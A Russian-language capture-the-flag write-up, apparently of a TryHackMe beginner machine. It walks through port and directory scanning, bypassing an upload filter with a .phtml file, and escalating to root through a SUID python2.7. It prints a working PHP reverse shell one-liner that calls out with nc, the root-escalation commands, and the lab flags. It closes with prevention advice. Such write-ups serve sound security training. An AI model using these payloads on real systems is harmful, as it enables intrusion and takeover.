## Кратко

Классическая машина для начинающих. Цепочка атаки: поиск скрытых директорий через `gobuster` → обход слабых ограничений формы загрузки файлов путем переименования скрипта в `.phtml` → получение reverse shell → повышение привилегий до `root` через SUID-бинарник `python2.7`.

## 1. Разведка

### Сканирование портов

```bash
nmap -sV 10.81.145.169

```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

По результатам сканирования открыты два порта: SSH (22) и веб-сервер Apache 2.4.41 (80).

### Перечисление сервисов

Для поиска скрытых веб-директорий использовалась утилита Gobuster:

```bash
gobuster dir -u http://10.81.145.169 -w /usr/share/wordlists/dirb/small.txt -x php

```

```

/js                   (Status: 301) [Size: 311] [--> http://10.81.145.169/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.81.145.169/panel/]

```

В ходе перечисления обнаружены две ключевые директории: `/panel` (форма загрузки файлов) и `/uploads` (каталог хранения загруженных файлов).

## 2. Получение доступа

При попытке загрузить PHP reverse shell в директории `/panel` система выдала ошибку о запрете файлов с расширением `.php`. Фильтрация была обойдена путем смены расширения на `.phtml`.

Загруженный код шелла:

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.112 8000 >/tmp/f"); ?>

```

После загрузки файла запускаем слушатель `nc -lnvp 8000` и переходим к файлу в директории `/uploads`. После успешного получения шелла стабилизируем TTY-терминал:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

Флаг пользователя найден в `/var/www/user.txt`.

**Флаг пользователя:** `THM{y0u_g0t_a_sh3ll}`

## 3. Повышение привилегий

Поиск бинарников с установленным SUID-битом:

```bash
find / -perm -4000 2>/dev/null

```

```
/usr/bin/python2.7

```

Среди стандартных файлов обнаружен `/usr/bin/python2.7` с SUID-битом, позволяющий исполнять код с правами владельца (`root`). В директории `/tmp` создан Python-скрипт:

```python
import os
os.system('/bin/bash -p')

```

Запуск скрипта через `/usr/bin/python2.7` предоставил доступ с правами `root` (флаг `-p` предотвратил сброс привилегий в `bash`):

```bash
/usr/bin/python2.7 /tmp/shell.py
# whoami
root
# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}

```

**Флаг root:** `THM{pr1v1l3g3_3sc4l4t10n}`

## Выводы

* **Уязвимости:** Валидация файлов только по черному списку расширений (`.php`), отсутствие проверки содержимого (MIME-type/Magic bytes), некорректно выставленный SUID-бит на интерпретаторе Python.
* **Как предотвратить:** Использовать белый список допустимых расширений (например, только `.jpg`, `.png`), хранить загружаемые файлы вне корня веб-сервера или отключать их исполнение, следовать принципу наименьших привилегий при назначении SUID-битов.
* **Чему научился:** Способам обхода простых черных списков расширений веб-форм и эскалации привилегий через SUID-бинарники интерпретаторов.
